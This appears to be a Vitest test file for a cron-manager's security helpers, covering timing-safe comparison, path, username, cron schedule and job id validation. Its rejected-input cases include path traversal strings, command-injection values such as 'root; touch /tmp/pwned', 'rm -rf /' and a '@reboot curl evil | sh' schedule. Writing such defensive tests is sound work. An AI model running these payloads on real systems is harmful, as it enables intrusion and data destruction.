import { describe, expect, it, vi } from "vitest";

vi.mock("crypto", async (importOriginal) => {
  const actual = await importOriginal<typeof import("crypto")>();
  return { ...actual, default: actual, timingSafeEqual: vi.fn(actual.timingSafeEqual) };
});

import { timingSafeEqual } from "crypto";
import {
  isSafeJobId,
  isSafePathSegment,
  assertSafeUsername,
  isValidCronSchedule,
  safeCompare,
  toSingleLine,
} from "@/app/_utils/security-utils";

describe("safeCompare", () => {
  it("matches equal strings and rejects everything else", () => {
    expect(safeCompare("hunter2", "hunter2")).toBe(true);
    expect(safeCompare("hunter", "hunter2")).toBe(false);
    expect(safeCompare("hunter2 ", "hunter2")).toBe(false);
    expect(safeCompare("", "hunter2")).toBe(false);
    expect(safeCompare(undefined, "hunter2")).toBe(false);
    expect(safeCompare(12345, "12345")).toBe(false);
    expect(safeCompare({ toString: () => "x" }, "x")).toBe(false);
  });

  it("goes through crypto.timingSafeEqual even when lengths differ", () => {
    vi.mocked(timingSafeEqual).mockClear();
    safeCompare("a", "a much longer secret value");
    expect(timingSafeEqual).toHaveBeenCalledOnce();
  });
});

describe("path helpers", () => {
  it.each([
    "..",
    ".",
    "",
    "../etc/passwd",
    "..\\..\\windows",
    "/etc/passwd",
    "logs/../../x",
    "file\0.log",
    "a".repeat(256),
  ])("rejects unsafe segment %j", (name) => {
    expect(isSafePathSegment(name)).toBe(false);
  });

  it.each(["2026-10-04_12-00-00.log", "my-script.sh", "abcd-1234.job", "..hidden"])(
    "accepts plain file name %j",
    (name) => {
      expect(isSafePathSegment(name)).toBe(true);
    }
  );
});

describe("assertSafeUsername", () => {
  it.each(["root", "www-data", "john.doe", "svc_backup", "user@corp.example", "MACHINE$"])(
    "accepts %j",
    (user) => {
      expect(assertSafeUsername(user)).toBe(user);
    }
  );

  it.each(["root; touch /tmp/pwned", "root\nid", "-r", "a b", "", "../root", 42, undefined])(
    "rejects %j",
    (user) => {
      expect(() => assertSafeUsername(user)).toThrow("Invalid crontab user");
    }
  );
});

describe("isValidCronSchedule", () => {
  it.each([
    "* * * * *",
    "*/5 * * * *",
    "0 9-17 * * MON-FRI",
    "0 0 1,15 * *",
    "30 4 1 jan sun",
    "0 0 L * ?",
    "@reboot",
    "@daily",
    "0\t0 * * *",
    "  15 3 * * *  ",
  ])("accepts %j", (schedule) => {
    expect(isValidCronSchedule(schedule)).toBe(true);
  });

  it.each([
    "",
    "   ",
    "* * * *",
    "* * * * * /bin/evil",
    "* * * * *\n* * * * * /bin/evil",
    "* * * * *\r\n@reboot curl evil | sh",
    "@reboot\n* * * * * id",
    "@reboot id",
    "$(id) * * * *",
    "* * * * ;id",
    "* * * * `id`",
  ])("rejects %j", (schedule) => {
    expect(isValidCronSchedule(schedule)).toBe(false);
  });
});

describe("misc", () => {
  it("collapses newlines into spaces", () => {
    expect(toSingleLine("hello\n* * * * * evil\r\nmore")).toBe("hello * * * * * evil more");
    expect(toSingleLine(undefined)).toBe("");
  });

  it("only accepts plain job ids", () => {
    expect(isSafeJobId("abcd-1234")).toBe(true);
    expect(isSafeJobId("a1b2c3d4")).toBe(true);
    expect(isSafeJobId('x" ; rm -rf / ; "')).toBe(false);
    expect(isSafeJobId("../../etc")).toBe(false);
    expect(isSafeJobId("abcd\n* * * * * id")).toBe(false);
    expect(isSafeJobId(undefined)).toBe(false);
  });
});
